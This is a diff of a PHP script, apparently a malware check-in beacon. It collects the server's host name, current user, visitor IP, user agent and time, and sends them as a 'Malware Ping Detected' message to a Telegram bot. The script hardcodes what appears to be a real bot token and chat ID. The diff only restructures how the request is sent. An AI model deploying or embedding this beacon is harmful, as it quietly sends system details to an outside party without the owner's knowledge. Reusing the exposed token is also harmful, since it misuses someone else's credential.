@@ -1,7 +1,7 @@
 <?php
 // Telegram Bot Info
 $token = '7600396803:AAGIajzJr6Bvn4Ficw6heKWuuUvFjgsqVOw';
-$chat_id = '7926968807'; // Replace this below after you get it
+$chat_id = '7926968807';
 
 // Server Info
 $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
@@ -10,7 +10,7 @@ $user = get_current_user();
 $timestamp = date('c');
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
 
-// Message to Telegram
+// Message
 $message = "🚨 *Malware Ping Detected*\n"
          . "*IP:* `$ip`\n"
          . "*Host:* `$host`\n"
@@ -18,10 +18,16 @@ $message = "🚨 *Malware Ping Detected*\n"
          . "*Time:* `$timestamp`\n"
          . "*User-Agent:* `$ua`";
 
-// Send message
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
+// Build URL
+$url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
     'chat_id' => $chat_id,
     'text' => $message,
     'parse_mode' => 'Markdown',
-]));
+]);
+
+// Try request and capture result
+$response = file_get_contents($url);
+
+// Log Telegram's response for debugging
+//file_put_contents('telegram_log.txt', $response . PHP_EOL, FILE_APPEND);
 ?>
